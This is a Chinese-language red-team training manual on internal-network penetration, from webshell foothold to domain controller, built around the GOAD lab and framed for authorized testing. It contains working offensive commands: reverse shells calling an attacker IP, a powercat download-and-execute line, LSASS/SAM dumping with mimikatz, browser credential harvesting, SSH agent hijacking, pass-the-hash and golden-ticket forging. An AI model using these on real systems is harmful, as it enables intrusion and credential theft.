@@ -1,0 +1,319 @@
+# VOL-03 · 内网渗透：从打点到域控
+
+> 受众：5 年源码审计/产品安全、刚转岗一人红队的工程师。Web 打点见 VOL-01-web-app-part1 / VOL-02-web-app-part2——你拿到的是一只 webshell 或低权限 shell，本卷解决"之后怎么办"：立足 → 隧道 → 凭据 → 提权 → 横向 → 域控 → 合规收尾。报告交付见 VOL-07-08-methodology-reporting。所有命令仅用于授权环境与本地靶场。
+
+## 目录
+1. 打点后第一件事：本机信息收集与域判断
+2. 隧道与代理：正向/反向 shell 与代理链
+3. 凭据获取：SAM/LSASS/DPAPI/Linux/浏览器
+4. 权限提升：Windows 四条主干与 Linux 判断流程
+5. 横向移动：非域环境与域环境（Kerberos 一页讲透）
+6. 域控攻防路径全景矩阵
+7. 痕迹处理与收尾（合规边界）
+8. GOAD 靶场分模块练习路径
+
+---
+
+## 1. 打点后第一件事：本机信息收集
+
+### 1.1 判断是否在域内（Windows）
+【原理】域（Domain）成员机的三个硬特征：机器账户在域控制器（Domain Controller, DC）注册、DNS 指向 DC、时间与 DC 同步（Kerberos 要求偏移 ≤5 分钟）。三者都留下可查询痕迹，无需任何工具即可判断。
+【操作】逐条执行并记录输出：
+```
+whoami /all
+net config workstation                     # "工作站域"字段
+echo %USERDNSDOMAIN%  %LOGONSERVER%
+net time /domain                           # 能否定位 DC
+nltest /dsgetdc:%USERDNSDOMAIN%            # 返回 DC 主机名与站点
+net user /domain                           # 拉取域用户列表
+net group "domain admins" /domain          # 拉取域管理员列表
+```
+【验证】任一成立即域内：`%USERDNSDOMAIN%` 返回完整域名（如 sevenkingdoms.local）；`net time /domain` 返回 \\某主机名（即 DC）；`nltest /dsgetdc:` 列出 DC 名称。
+【陷阱】① 用本地账户登录域机器时 `%LOGONSERVER%` 指向本机，别据此误判"不在域"；② 多域/林（Forest）环境下 UPN 后缀可能自定义，用 `whoami /upn` 交叉确认；③ webshell 下 systeminfo 噪声大，优先上面这些纯查询命令。
+
+### 1.2 Windows 本机收集清单
+【原理】对应 MITRE ATT&CK T1082 系统信息发现。目标是在提权前回答四问：我是谁（身份/特权）、我在哪（网段/角色）、周围有谁（存活/服务）、谁在管我（杀软/监控）。
+【操作】
+```
+whoami /all                                   # 重点:SeDebugPrivilege/SeImpersonatePrivilege、本地管理员组
+net localgroup administrators
+ipconfig /all & route print & arp -a          # 全部网卡与网段,双网卡=天然跳板
+netstat -ano                                  # 现有连接里常有运维来源 IP
+tasklist /svc & net start                     # 服务与对应进程
+query user                                    # RDP 会话,可能藏着别人登录态
+tasklist /svc | findstr /i "MsMpEng ZhuDongFangYu 360Tray QAXGuard hrClient"
+wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName
+dir /s /b C:\Users\*pass*.txt C:\Users\*.rdp 2>nul  # 定向找凭据文件,别全盘 findstr
+```
+【验证】产出"本机档案"：账户与特权 / 网段清单 / 杀软与 EDR 清单 / RDP 会话 / 疑似凭据文件，后续每一节都以此为输入。
+【陷阱】① `whoami /priv` 里特权显示"已禁用"是常态（新登录会话才启用），不等于没有提权空间；② 32 位 shell 看不全 64 位进程与注册表重定向，优先起 64 位 powershell；③ 大范围 findstr 会触发文件审计与 EDR 行为检测，按目录收缩。
+
+### 1.3 Linux 本机收集
+【原理】同样四问，但 Linux 的重心是：sudo 策略、计划任务（Cron）、SSH 私钥与历史命令——它们直接决定提权路径与横向资本。
+【操作】
+```
+id && sudo -l && uname -a && cat /etc/issue
+ip a && ss -antup | head -30
+grep -vE "nologin|false" /etc/passwd          # 有登录 shell 的用户
+ls -l /etc/shadow                            # 直接可读=直接跑哈希
+grep -hiE "ssh|pass|mysql|psql|export" ~/.bash_history /home/*/.bash_history 2>/dev/null
+ls -la ~/.ssh/ && find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
+crontab -l ; ls -la /etc/cron* ; cat /etc/rc.local
+find / -perm -4000 -type f 2>/dev/null        # SUID 清单,待 4.2 节对照
+grep -riE "password|secret" /etc /var/www --include="*.conf" --include="*.env" --include="*.yml" 2>/dev/null | head -50
+id | grep -w docker                          # docker 组≈事实 root
+```
+【验证】命中任一项即获得下一步钥匙：sudo NOPASSWD 条目 / GTFOBins 命中的 SUID / 可下载私钥 / history 里的明文口令。
+【陷阱】① history 可能被 `unset HISTFILE` 清空，改查 /home/*/.bash_history 与 /var/log/auth.log；② ss 看到监听≠外部可达，叠加 `iptables -L -n` 判断；③ 全盘 find 触发 auditd，能定位目录就别全盘扫。
+
+【练习】GOAD 的 castelblack（Defender 默认关闭，适合第一次完整收集）；HTB Sauna（Easy，AD 信息收集与用户枚举入门；退役机需 VIP 订阅，可用性以官方机器列表为准）。
+
+---
+
+## 2. 隧道与代理
+
+### 2.1 正向/反向 shell
+【原理】正向 shell（Bind Shell）：被控端监听端口，控制端连入——要求被控端口可达；反向 shell（Reverse Shell）：控制端监听、被控端回连——只需被控端可出网，能穿 NAT 与边界防火墙，实战默认选反向。
+【操作】
+```
+# 反向·Linux 目标
+nc -lvnp 4444                                  # 攻击端
+bash -i >& /dev/tcp/<攻击IP>/4444 0>&1         # 目标端
+python3 -c 'import pty;pty.spawn("/bin/bash")' # 目标端升级交互终端
+# 然后: Ctrl-Z; 攻击端 stty raw -echo; fg; export TERM=xterm
+# 反向·Windows 目标(powercat,参数以项目 README 为准)
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p 4444 -e powershell"
+# 正向·仅当目标端口可达(OpenBSD nc 无 -e,用管道)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp 4444 > /tmp/f   # 目标端
+nc <目标IP> 4444                               # 攻击端
+```
+【验证】出现目标提示符、`id`/`whoami` 有回显；pty 升级后 sudo、vim、上下键正常。
+【陷阱】① 目标出网仅放行 53/443 时换端口重试；② `bash -i` 在 /bin/sh（dash）下语法报错，先确认 shell；③ 反弹 shell 里 Ctrl-C 会断会话，重要操作先进 pty。
+
+### 2.2 代理与端口转发：何时用哪个
+【原理】选型只看被控点的出网能力：① TCP 可自由出网 → 反向 SOCKS5；② 仅 HTTP(S) 出网（只有 webshell）→ HTTP 隧道；③ 完全不出网 → 目标机上的正向端口转发（Port Forwarding）逐层跳。
+【操作】
+① frp（fatedier/frp，反向 SOCKS5）：VPS 跑 frps（frps.toml 含 `bindPort = 7000` 与 `auth.token`），靶机 frpc.toml（v0.52+ 为 TOML，以下为官方示例格式，文档 https://gofrp.org）：
+```toml
+serverAddr = "<VPS_IP>"
+serverPort = 7000
+[[proxies]]
+name = "socks5"
+type = "tcp"
+remotePort = 1080
+[proxies.plugin]
+type = "socks5"
+username = "xxx"
+password = "xxx"
+```
+VPS 的 1080 即进入内网的 SOCKS5 入口。② nps（ehang-io/nps）：自带 Web 面板的一体化方案，长期未更新，选型前自行评估仓库状态。③ Neo-reGeOrg（HTTP 隧道）：把 tunnel.jsp/php/aspx 放进已控 Web 路径，`python3 neoreg.py -k <连接密码> -u http://target/tunnel.php`，本地 127.0.0.1:1080 即 SOCKS5（参数以 README 为准：https://github.com/L-codes/Neo-reGeOrg）。④ 端口转发：Windows 自带 `netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.5 connectport=3389`（需管理员）；SSH 跳板 `ssh -L 3389:10.0.0.5:3389 user@jump`、反向 `ssh -R`、动态 `ssh -D 1080`。挂载后统一走 proxychains-ng（proxychains4.conf 配 socks5 127.0.0.1 1080）。
+【验证】`proxychains4 curl http://<内网IP>` 返回页面；`proxychains4 nmap -sT -Pn -n -p 80,445,3389 <内网段>` 出端口清单；VPS 上 1080 端口 established。
+【陷阱】① proxychains 只代理 TCP：nmap 必须 -sT -Pn -n，ICM/UDP 探测不走代理；conf 里 localnet 段会把目标网段直连造成泄漏，注释掉；② frp 默认特征明显，授权项目控制扫描速率与连接数；③ neoregeorg 依赖 Web 容器可写可解析路径，上传前先确认。
+
+【练习】TryHackMe Wreath 网络（免费，专门按"边界机→内网→域控"三层 pivot 设计，覆盖本节全部内容）；frp 先在两台本地虚拟机跑通再上靶场。
+
+---
+
+## 3. 凭据获取
+
+### 3.1 Windows：SAM 与 LSASS（含防御视角）
+【原理】SAM（安全账户管理器，Security Account Manager）存本机账户的 NTLM 哈希（NT LAN Manager hash），仅 SYSTEM 可读；lsass.exe（本地安全机构子系统进程）内存缓存所有交互登录凭据（NTLM 哈希、Kerberos 票据、个别明文——WDigest 明文缓存自 Win 8.1/Server 2012 R2 起默认关闭）。mimikatz 的 `sekurlsa::logonpasswords` 本质就是读 lsass 内存。防御视角：Credential Guard（VBS 隔离 lsass）、RunAsPPL、EDR 对 lsass 句柄获取/转储行为重点监控——授权项目里转储前必须与客户书面约定。
+【操作】（需 SYSTEM 或 SeDebugPrivilege）
+```
+reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM sys.hive
+impacket-secretsdump -sam sam.hive -system sys.hive LOCAL        # 离线解析本机哈希
+tasklist /fi "imagename eq lsass.exe"                            # 取 PID
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\temp\out.dmp full
+procdump -accepteula -ma lsass.exe out.dmp                       # Sysinternals 替代
+# 离线解析 dmp:
+mimikatz "sekurlsa::minidump out.dmp" "sekurlsa::logonpasswords" "exit"
+```
+【验证】secretsdump 输出形如 `Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::`（RID 500=内置管理员）；minidump 输出含 `* Username : 域\用户`、NTLM 与 `.:::` 行——哈希直接进第 5 节 PTH。
+【陷阱】① comsvcs MiniDump 的输出路径必须绝对路径且目录存在，否则静默失败；② Defender 实时防护会抓 procdump/mimikatz 样本，授权测试应走检测豁免流程，或把"能否检出"本身作为交付项；③ dmp 几十 MB，隧道里传得慢——优先在目标本地解析、只回传文本结果。
+
+### 3.2 DPAPI 与浏览器凭据
+【原理】数据保护 API（Data Protection API, DPAPI）用主密钥加密 Chrome/Edge 保存密码、凭据管理器里的 RDP 凭据等；主密钥由"用户口令哈希+SID"派生——拿到用户 NTLM 哈希即可连锁解密。Chrome 80+ 密码为 AES-GCM，密钥又在 Local State 里被 DPAPI 保护。
+【操作】
+```
+SharpDPAPI.exe triage            # harmj0y/SharpDPAPI,一键收割主密钥+凭据+浏览器
+SharpDPAPI.exe browsers
+hackbrowserdata -b all -f json -d ./  # Go 跨平台(Windows/Linux/macOS),参数以 README 为准
+```
+【验证】输出表格出现 url/username/password 明文列；RDP 凭据能还原出目标主机与口令。
+【陷阱】① 必须在目标用户上下文（RunAs 其会话）运行，或已拿到其 NTLM 哈希；② 新版 Chrome 引入更强的绑定加密，成功率随版本下降，以工具 issue 区当前反馈为准。
+
+### 3.3 Linux 凭据面
+【原理】Linux 凭据散落为私钥、历史命令、配置文件三类；一次打包优于逐个翻找，且 /etc/shadow 一旦可读就是离线破解入口。
+【操作】
+```
+tar czf /tmp/c.tar.gz ~/.ssh /home/*/.ssh 2>/dev/null            # 私钥打包
+grep -rhiE "password|secret" /home /opt /srv /var/www --include="*.env" --include="*.conf" --include="*.yml" 2>/dev/null | head -50
+grep -i "accepted" /var/log/auth.log                              # 谁常从哪登录
+# shadow 离线破解:
+unshadow passwd shadow > hash.txt && john hash.txt                # 或 hashcat -m 1800
+```
+【验证】`ssh -i id_rsa user@host` 直接登录成功；john/hashcat 跑出弱口令。
+【陷阱】① sha512crypt 用 hashcat -m 1800，速度慢，选弱口令字典；② authorized_keys 公钥清单是"谁能登本机"的横向地图，别只看私钥。
+
+【练习】GOAD：拿下 castelblack 后抓 lsass（Defender 关，完整练 mimikatz/procdump 流程）；HTB Sauna（Easy，凭据收割→横向入门一条龙）。
+
+---
+
+## 4. 权限提升
+
+### 4.1 Windows 提权四条主干
+【原理】①未加引号服务路径（Unquoted Service Path）：CreateProcess 对带空格路径逐级尝试解析，可写目录+短名可执行文件即可劫持；②UAC（用户账户控制，User Account Control）绕过：管理员账户默认 Medium 完整性级别，利用自动提权程序（如 fodhelper）的注册表劫持拿到 High；③令牌（Token）滥用：SeImpersonatePrivilege（服务账户/IIS 应用池默认持有）可模拟客户端身份——Potato 家族全部建立在这上面；④内核漏洞：补丁缺失时最稳但风险最高。
+【操作】
+```
+# 服务路径
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i ".exe"
+icacls "C:\Program Files\Vuln Dir"            # 检查是否 W(可写)
+# UAC 状态
+whoami /groups | findstr "Mandatory Label"      # High=已提权; Medium=可尝试绕过
+# 令牌
+whoami /priv                                    # SeImpersonatePrivilege 已启用 → Potato
+# 补丁面
+systeminfo > sys.txt                            # 配合 windows-exploit-suggester 比对
+```
+Potato 家族谱系（一脉相承：诱骗高权限服务向攻击者发起 NTLM 认证→中继回 SYSTEM）：Hot Potato（WPAD/NBNS 欺骗）→ Rotten/Juicy Potato（COM 激活，Juicy 适用老系统）→ Rogue Potato（Win10 1809+，需外部机器配合 RPC 中继）→ PrintSpoofer/Sweet Potato（伪造打印机命名管道）→ GodPotato/JuicyPotatoNG（近年新系统组合）。适用版本区间以各项目 README 为准（如 https://github.com/antonioCoco/PrintSpoofer 、https://github.com/BeichenDream/GodPotato ）。
+【验证】提权后 `whoami /groups` 显示 Mandatory Label\\High 或 `nt authority\\system`；服务路径劫持用 `net start <服务名>` 触发；Potato 直接吐 SYSTEM shell。
+【陷阱】① Potato 前提是 SeImpersonate 处于"已启用"（webshell 的网络服务账户刚好满足）；② UAC=始终通知时多数绕过失效；③ 服务器上别盲打内核漏洞，崩了影响授权业务。
+
+### 4.2 Linux 提权判断流程
+【原理】顺序固定：先低噪声配置类（sudo/SUID/cron），后内核——反着做既触发告警又可能宕机。
+【操作】
+```
+sudo -l                                          # NOPASSWD 条目 → https://gtfobins.github.io 对照
+find / -perm -4000 -type f 2>/dev/null | xargs ls -l   # SUID → GTFOBins
+ls -la /etc/cron* ; cat /etc/crontab             # 可写脚本;通配符注入(tar --checkpoint=1)
+getcap -r / 2>/dev/null                          # capabilities(cap_setuid 等)
+uname -r                                         # 内核版本对照
+```
+内核判断：5.8 ≤ 版本 <5.16.11/5.15.25/5.10.102 区间优先 DirtyPipe（CVE-2022-0847，任意只读文件覆写 /etc/passwd）；sudo <1.9.5p2 试 Baron Samedit（CVE-2021-3156）；老 4.x 内核试 DirtyCow（CVE-2016-5195）。均为公开漏洞，PoC 影响范围先核对再打。
+【验证】GTFOBins 给出的原语成功，如 `sudo find / -exec /bin/sh \; ` 得 root shell。
+【陷阱】① 内核 PoC 可能崩机，授权环境先打快照；② sudo 规则若限定参数，GTFOBins 的 shell 原语不成立，逐条读策略；③ 容器内先查 privileged 与 /var/run/docker.sock 挂载，比内核提权更快更稳。
+
+【练习】HTB Lame（Easy，SUID 入门）、Nibbles（Easy，sudo NOPASSWD）、Shocker（Easy，Shellshock+提权组合）；GOAD castelblack 的 IIS 应用池练 SeImpersonate→PrintSpoofer。HTB 退役机需 VIP，以官方列表为准。
+
+---
+
+## 5. 横向移动
+
+### 5.1 非域环境
+【原理】非域内网两条通用路径：凭据复用（运维批量部署导致同口令/同哈希）与 SSH 密钥复用；核心是"收集→去重→小批量验证→扩大"。
+【操作】
+```
+for h in $(cat hosts.txt); do sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$h id; done
+for h in $(cat hosts.txt); do ssh -i stolen_key -o BatchMode=yes -o ConnectTimeout=3 user@$h id; done
+# 跳板上发现 SSH agent 转发:
+ls -la /tmp/ssh-*/agent.*
+SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.NNNN ssh root@下一跳   # 劫持被转发 agent
+```
+【验证】脚本输出非空 uid 回显清单=有效凭据资产表。
+【陷阱】① 批量失败触发 fail2ban/账户锁定，控制并发与重试；② agent 劫持仅当前会话有效，拿不到密钥本体；③ 别漏 Windows 非域机器的 SMB——netexec 同样适用（见 5.3）。
+
+### 5.2 Kerberos 认证一页讲透
+【原理】域认证三方：客户端 / KDC（密钥分发中心，即 DC）/ 目标服务。四步：
+① AS-REQ：用户用自身 NTLM 哈希加密时间戳，发送预认证；
+② AS-REP：DC 返回登录会话密钥 + TGT（票据授权票据，Ticket Granting Ticket，由 krbtgt 密钥加密——DC 只验签不验人）；
+③ TGS-REQ：持 TGT 向 DC 申请访问某 SPN（服务主体名称，Service Principal Name）的服务票据；
+④ TGS-REP / AP-REQ：DC 返回用目标服务账户 NTLM 加密的服务票据，服务解密验签后放行。
+此后所有域攻击都是对某一环打折：①②环被 AS-REP Roasting（5.4），③④环被 Kerberoasting（5.4）与白银票据（5.5）打，TGT 本体被黄金票据（5.5）伪造，NTLM 体系被 PTH（5.3）绕过。
+【操作】`net time \\DC` 校时；`klist` 查看当前会话票据。
+【验证】klist 列出 krbtgt 的 TGT 与各服务票据，即处在本机 Kerberos 会话中。
+【陷阱】时间偏移 >5 分钟一切 Kerberos 攻击报 KRB_AP_ERR_MODIFIED——先校时再排错。
+
+### 5.3 哈希传递（Pass the Hash, PTH）
+【原理】NTLM 挑战-响应中哈希即凭据，全程不需明文；拥有哈希=拥有账户。
+【操作】
+```
+impacket-psexec -hashes :<NTLM哈希> sevenkingdoms.local/user@10.0.0.10
+netexec smb 10.0.0.0/24 -u user -H <NTLM哈希> --sam      # netexec 是 CrackMapExec 的社区延续(Pennyw0rth/NetExec)
+netexec smb 10.0.0.0/24 -u user -H <NTLM哈希> --local-auth  # 打本地账户时必加
+```
+【验证】psexec 回落 SYSTEM shell；netexec 输出 Pwn3d! 标记。
+【陷阱】① 域哈希与本地哈希要区分，机器账户哈希（$ 结尾）只对本机资源有效；② 445 出站被禁的环境改走 WMI（impacket-wmiexec）；③ 高频失败触发账户锁定，先小网段试探。
+
+### 5.4 Kerberoasting 与 AS-REP Roasting
+【原理】Kerberoasting：任何域用户都能为任意 SPN 申请服务票据（TGS-REP），票据用服务账户 NTLM（RC4 时）加密，强度=服务账户口令强度 → 抓下来离线破解。AS-REP Roasting：未启用预认证（DONT_REQ_PREAUTH）的账户可无凭据直接获得用其哈希加密的 AS-REP → 同样离线破解。两者都不碰目标服务，纯属"领票+离线跑字典"。
+【操作】
+```
+impacket-GetUserSPNs north.sevenkingdoms.local/jon.snow:口令 -dc-ip 10.10.10.16 -request > tgs.txt
+hashcat -m 13100 tgs.txt 字典.txt                 # RC4; AES 时换对应模式,以 hashcat example_hashes 页为准
+impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.16 > asrep.txt
+hashcat -m 18200 asrep.txt 字典.txt
+```
+【验证】hashcat 状态 Cracked、吐出服务账户明文；用其登录/RDP 对应主机成功。
+【陷阱】① 字典质量决定成败：收集客户口令规律（公司名+年份、Season+YYYY——GOAD 里 rickon.stark 的 WinterYYYY 就是教科书示范）；② gMSA 账户口令 256 位随机，别硬跑，改为授权下读取（gMSADumper 思路）；③ 检测面：DC 事件 4769/4768 中 RC4（0x17）加密请求暴增是蓝队指标——这也是你报告里的检测建议素材。
+
+### 5.5 黄金票据与白银票据
+【原理】黄金票据（Golden Ticket）：拿到 krbtgt 哈希即可自签任意用户的 TGT（DC 无条件信任自己签发的票据内容），全域任意服务有效。白银票据（Silver Ticket）：拿到服务账户哈希直接伪造服务票据，不经过 KDC——只对该服务有效，但不产生 KDC 流量、更隐蔽。
+【操作】
+```
+# 拿 DA 后提取 krbtgt:
+impacket-secretsdump -just-dc-user krbtgt north.sevenkingdoms.local/da用户:口令@10.10.10.16
+# mimikatz 伪造黄金票据并注入:
+kerberos::golden /user:fakeadmin /domain:north.sevenkingdoms.local /sid:S-1-5-21-XXX /rc4:<krbtgt哈希> /id:500 /ptt
+dir \\winterfell\c$
+# 白银票据: 同命令改 /rc4:<服务账户哈希> /service:cifs /target:winterfell
+```
+【验证】/ptt 后 klist 出现新票据，dir 目标机共享成功、psexec 直连。
+【陷阱】① /sid 是域 SID（去掉末位 RID），取错必失败；② 黄金票据只在本域有效，跨域/跨林要重新拿目标域 krbtgt；③ 修复需两次重置 krbtgt（利用密码历史），黄金票据才失效——写进报告的整改建议别漏"两次"。
+
+【练习】GOAD 官方场景逐一对号：brandon.stark=AS-REP、jon.snow=Kerberoast、完成 north 域 DA 后对 winterfell 做 DCSync→黄金票据。配官方推荐 writeup：https://mayfly277.github.io/categories/goad/ 。
+
+---
+
+## 6. 域控攻防路径全景矩阵
+
+【原理】DC 是域的大脑：所有认证经它、全域哈希躺在它的 NTDS.dit 里。打 DC 的路径只有三类：凭据链路（最常见）、协议/服务漏洞（碰运气）、强制认证+中继。矩阵行=你当前持有的资本，列=典型打法与收益。
+【操作】
+| 你有什么 | 典型打法 | 收益 |
+|---|---|---|
+| 普通域用户 | Kerberoast/AS-REP；BloodHound 找 ACL 滥用最短路径 | 服务账户→间接 DA |
+| 服务账户 | 约束委派/基于资源的约束委派（RBCD）滥用 | 模拟任意用户 |
+| 可触发他人认证 | Responder 毒化 LLMNR/NBT-NS + NTLM 中继到 LDAP/SMB | 建机器账户→RBCD |
+| SYSVOL/GPO 权限 | 恶意 GPO 脚本下发（GOAD 的 STARKWALLPAPER 即此） | 批量拿域机器 |
+| DA 任一账户 | DCSync（secretsdump -just-dc） | 全域哈希+krbtgt |
+| DC 可达+未打补丁 | Zerologon（CVE-2020-1472）、noPac（CVE-2021-42278/42287）、PrintNightmare（CVE-2021-1675/34527）、PetitPotam 强制认证→AD CS 中继 | 直接控 DC |
+| MSSQL 账户 | xp_cmdshell / EXECUTE AS 模拟 / 数据库链路（link） | 跨服务器跳板 |
+
+路径采集：`bloodhound-python -d 域 -u 用户 -p 口令 -dc <DC> -c All`（参数以 README 为准）；防御对照逐项写进报告：Zerologon→安全通道签名强化、noPac→两枚补丁、PetitPotam→禁用 MS-EFSRPC+启用 EPA/通道绑定、黄金票据→krbtgt 双重重置，细节以微软官方安全公告为准。
+【验证】矩阵每行至少在 GOAD 复现一条（见第 8 节路径），能向客户复盘"如果补了 X，这条链断在哪"。
+【陷阱】别迷信 Zerologon 一步登天——补丁齐全的现实环境里，上三行的凭据链路才是常态打法。
+
+【练习】GOAD 模块 E/F（见第 8 节）对照本矩阵逐行复现；再用 BloodHound 为 GOAD 三个域各找一条"普通用户→DA"最短路径并截图存档。
+
+---
+
+## 7. 痕迹处理与收尾（合规边界）
+
+【原理】红队的"痕迹处理"仅指清理自己新增的持久化构件；删除或篡改客户日志=销毁证据，超出授权甚至触法。日志是蓝队的答卷，让它留着并写进报告才是交付价值（报告规范见 VOL-07-08-methodology-reporting）。
+【操作】收尾清单逐项打勾：
+- 删除落地工具、上传的 webshell/tunnel 文件与自解压目录
+- 删除新增账号（`net user 名 /delete`）、计划任务、自启动注册表项
+- 恢复网络改动：`netsh interface portproxy delete v4tov4 listenport=...`，关闭 frp/nps 进程并清配置
+- 整理操作时间线（时间/主机/命令/结果），确保与客户日志可对账
+- 报告输出：攻击路径图（打点→DC）+ 每步对应事件 ID（4624 登录 / 4768 4769 票据 / 4104 PowerShell 脚本块）+ 未检出项清单
+【验证】复检：新增账号为空、portproxy 列表为空、上传文件哈希清单比对无残留。
+【陷阱】① 授权书范围外的主机一律不碰，哪怕"顺路"；② 时间窗结束即停，未竟项写进复测建议而非硬闯；③ 破坏性验证（加密/擦除/停业务）需单独书面授权，默认不做。
+
+【练习】无独立靶场：GOAD 打完一轮后按本节清单收尾，再翻 Defender/事件日志复盘自己哪些动作被记录——这份对照表直接进报告附录。
+
+---
+
+## 8. GOAD 靶场分模块练习路径
+
+【原理】GOAD v3（Orange-Cyberdefense，https://orange-cyberdefense.github.io/GOAD/ ）：5 台 VM、2 林 3 域——sevenkingdoms.local（kingslanding·DC01·WS2019）、north.sevenkingdoms.local（winterfell·DC02·WS2019；castelblack·SRV02·WS2019·Defender 默认关）、essos.local（meereen·DC03·WS2016；braavos·SRV03·WS2016）。机器少、场景密度高，是一人红队最合适的域练兵场；官方 writeup 见 https://mayfly277.github.io/categories/goad/ 。
+【操作】六模块递进（括号对应本卷章节）：
+- A 打点：castelblack 的 IIS 允许 asp 上传 → webshell（§1、§2：Defender 关，正好练 frp 与信息收集）
+- B 提权：IIS 应用池 SeImpersonate → PrintSpoofer → SYSTEM → 抓 lsass（§3、§4）
+- C 数据库：castelblack MSSQL，arya.stark EXECUTE AS USER 模拟 → dbo → xp_cmdshell；MSSQL 链路（link）由 jon.snow 通向 braavos 的 sa（§5.1 思想）
+- D 凭据攻击：brandon.stark AS-REP；rickon.stark 口令喷洒 WinterYYYY；hodor 弱口令；jon.snow Kerberoast（§5.4）
+- E 中继与委派：GOAD 内置机器人 eddard.stark 每 5 分钟发 LLMNR 请求 → Responder/中继；sansa.stark 非约束委派；samwell.tarly 的 GPO 滥用（STARKWALLPAPER）（§6）
+- F 拿 DC：north 域 DA 后对 winterfell DCSync → 黄金票据 → 跨信任打 sevenkingdoms（tywin→jaime→joffrey 的 ACE 链）→ cersei.lannister（DA）→ kingslanding（§5.5、§6）
+资源紧张：GOAD-Light（3 VM）替代完整版；只练单机打点用 MINILAB；进阶盲打用 NHA/DRACARYS（官方不提供拓扑）。
+【验证】结业标准：能独立画出自己的完整路径图（打点机→凭据→横向→DA→DC），并在每个节点标注对应的 Windows 事件 ID。
+【陷阱】① GOAD 官方警告"极其易受攻击"——只准跑在隔离虚拟网络；② Windows 评估版 180 天到期需重建；③ 场景随版本演进，动手前以官方文档当期列表为准。
+
+（本卷完。打点入口见 VOL-01-web-app-part1 / VOL-02-web-app-part2；白盒联动见 VOL-04-source-assist；客户端情报见 VOL-05-client-package；方法论与报告交付见 VOL-07-08-methodology-reporting。）
